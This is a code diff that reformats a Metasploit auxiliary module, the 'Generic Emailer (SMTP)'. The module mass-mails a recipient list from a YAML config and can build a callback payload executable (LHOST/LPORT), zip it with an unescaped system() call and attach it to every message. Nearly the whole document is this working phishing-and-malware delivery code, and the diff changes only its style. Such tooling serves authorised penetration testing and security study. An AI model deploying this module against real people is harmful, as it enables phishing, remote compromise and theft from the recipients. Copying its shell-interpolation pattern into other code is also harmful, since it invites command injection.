@@ -1,15 +1,13 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 require 'yaml'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   #
   # This module sends email messages via smtp
   #
@@ -18,26 +16,27 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Generic Emailer (SMTP)',
-      'Description'    => %q{
-          This module can be used to automate email delivery.
-        This code is based on Joshua Abraham's email script for social
-        engineering.
-      },
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'URL', 'http://spl0it.org/' ],
-        ],
-      'Author'         => [ 'et <et[at]metasploit.com>' ]))
+                      'Name'           => 'Generic Emailer (SMTP)',
+                      'Description'    => %q(
+                          This module can be used to automate email delivery.
+                        This code is based on Joshua Abraham's email script for social
+                        engineering.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'URL', 'http://spl0it.org/' ]
+                        ],
+                      'Author'         => [ 'et <et[at]metasploit.com>' ]))
 
-      register_options(
-        [
-          OptString.new('RHOST', [true, "SMTP server address",'127.0.0.1']),
-          OptString.new('RPORT', [true, "SMTP server port",'25']),
-          OptString.new('YAML_CONFIG', [true, "Full path to YAML Configuration file",
-            File.join(Msf::Config.data_directory,"emailer_config.yaml")]),
-        ], self.class)
+    register_options(
+      [
+        OptString.new('RHOST', [true, "SMTP server address", '127.0.0.1']),
+        OptString.new('RPORT', [true, "SMTP server port", '25']),
+        OptString.new('YAML_CONFIG', [true, "Full path to YAML Configuration file",
+                                      File.join(Msf::Config.data_directory, "emailer_config.yaml")])
+      ], self.class
+    )
 
     # Hide this option from the user
     deregister_options('MAILTO')
@@ -48,7 +47,7 @@ class MetasploitModule < Msf::Auxiliary
     opts = {}
 
     File.open(datastore['YAML_CONFIG'], "rb") do |f|
-      yamlconf = YAML::load(f)
+      yamlconf = YAML.load(f)
 
       opts['to']                   = yamlconf['to']
       opts['from']                 = yamlconf['from']
@@ -88,7 +87,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-
     yamlconf = load_yaml_conf
 
     fileto               = yamlconf['to']
@@ -118,9 +116,9 @@ class MetasploitModule < Msf::Auxiliary
 
     datastore['MAILFROM'] = from
 
-    msg       = load_file(msg_file)
+    msg = load_file(msg_file)
 
-    if (type !~ /text/i and type !~ /text\/html/i)
+    if type !~ /text/i && type !~ /text\/html/i
       print_error("YAML config: #{type}")
     end
 
@@ -130,7 +128,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_status("Creating payload...")
       mod = framework.payloads.create(msf_payload)
-      if (not mod)
+      unless mod
         print_error("Failed to create payload, #{msf_payload}")
         return
       end
@@ -139,14 +137,12 @@ class MetasploitModule < Msf::Auxiliary
       # framework to pick one for us.  In general this is the best
       # way to encode.
       buf = mod.generate_simple(
-          'Format'  => 'raw',
-          'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
-        )
-      exe = generate_payload_exe({
-          :code => buf,
-          :arch => mod.arch,
-          :platform => mod.platform
-        })
+        'Format'  => 'raw',
+        'Options' => { "LHOST" => msf_ip, "LPORT" => msf_port }
+      )
+      exe = generate_payload_exe(code: buf,
+                                 arch: mod.arch,
+                                 platform: mod.platform)
 
       print_status("Writing payload to #{attachment_file}")
       # XXX If Rex::Zip will let us zip a buffer instead of a file,
@@ -164,7 +160,7 @@ class MetasploitModule < Msf::Auxiliary
 
       if zip_payload
         zip_file = attachment_file.sub(/\.\w+$/, '.zip')
-        system("zip -r #{zip_file} #{attachment_file}> /dev/null 2>&1");
+        system("zip -r #{zip_file} #{attachment_file}> /dev/null 2>&1")
         attachment_file      = zip_file
         attachment_file_type = 'application/zip'
       else
@@ -172,7 +168,6 @@ class MetasploitModule < Msf::Auxiliary
       end
 
     end
-
 
     File.open(fileto, 'rb').each do |l|
       next if l !~ /\@/
@@ -183,12 +178,11 @@ class MetasploitModule < Msf::Auxiliary
       lname = name[1]
       email = nem[1]
 
-
-      if add_name
-        email_msg_body = "#{fname},\n\n#{msg}"
-      else
-        email_msg_body = msg
-      end
+      email_msg_body = if add_name
+                         "#{fname},\n\n#{msg}"
+                       else
+                         msg
+                       end
 
       if sig
         data_sig = load_file(sig_file)
@@ -215,10 +209,9 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       send_message(mime_msg.to_s)
-      select(nil,nil,nil,wait)
+      select(nil, nil, nil, wait)
     end
 
     print_status("Email sent..")
   end
-
 end
